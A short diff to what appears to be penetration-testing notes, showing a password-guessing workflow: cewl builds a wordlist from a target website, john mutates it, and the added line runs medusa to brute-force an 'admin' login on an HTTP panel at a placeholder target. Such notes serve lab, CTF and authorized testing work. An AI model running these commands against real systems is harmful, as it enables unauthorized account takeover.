@@ -4,6 +4,7 @@ cewl http://<targetip>/ -m 6 -w cewl.txt
 wc -l cewl.txt
 john --wordlist=cewl.txt --rules --stdout > mutated.txt
 wc mutated.txt
+medusa -h <targetip> -u admin -P mutated.txt -M http -n 80 -m DIR:/directory/to/login/panel -T 30
 
 -----------------------------------
 
